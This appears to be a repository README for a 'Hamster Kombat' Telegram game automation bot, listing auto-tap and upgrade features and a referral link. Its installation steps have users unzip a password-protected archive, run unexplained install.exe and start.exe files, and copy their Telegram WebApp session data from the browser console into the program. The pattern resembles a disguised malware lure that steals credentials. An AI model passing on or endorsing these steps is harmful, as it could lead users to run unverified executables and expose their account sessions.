refer link : https://t.me/hamsTer_kombat_bot/start?startapp=kentId58692195625

## Overview

The **Hamster Kombat Automation Bot**  will automate tasks in Hamster Kombat. it was code to be hosted in cloud 24/7.

## Features
- **Auto Tap**: Automatically tap.
- **Auto Claim Daily Rewards**: Ensures you never miss a daily reward.
- **Auto Cipher**: auto claim/complete chiper.
- **Auto Upgrade with Priority Function**: Upgrades stuff based on set priorities.
- **Auto Boost Upgrades**: upgrade boosts automatically.
- **Auto Complete Daily Combo**: Completes daily combo automatically.

## To Do
- **Auto Complete Daily Cypher**



Set priority from line 18 in main.py 

Example of priority upgrade option
priority = ["Specials", "PR&Team", "Markets", "Legal"]  this is Default
priority = []  for all upgrade section
priority = None  for no upgrade
priority = ["Specials"]  for single priority upgrade
priority = ["Specials","Markets"]  for multiple priority upgrade, will follow the order of list
priority = "YouTube 25 Million" for single priority upgrade, will keep upgrading



## Installation

1. **Download the Repository**


2. **Unzip archive**: Password - victorius190


3. **Run install.exe file to install all the dependencies**


4. **Capture the Authorization Token**


### PC

Download Telegram for PC from the Microsoft Store and follow these steps:

1. Navigate to `Settings > Advanced > Experimental > Enable Web Specting`.
2. Click play on Hamster Combat.
3. Open a new window, right-click, and select `Inspect`.
4. In the `Console`, paste the following script:
    ```javascript
    window.Telegram.WebApp.initData
    ```
   This will return something like:
    ```text
    'query_id=xyz&user=xyzfirst_name%xyzlast_name%xyz&auth_date=xyz&hash=xyz'
    ```

5. Paste this data into `initData.txt` without the **quotes**.
6. Run the script to generate the auth token:
    ```bash
    python authgen.py
    ```

## Configuration

Run start.exe, and paste your auth token.

enjoy!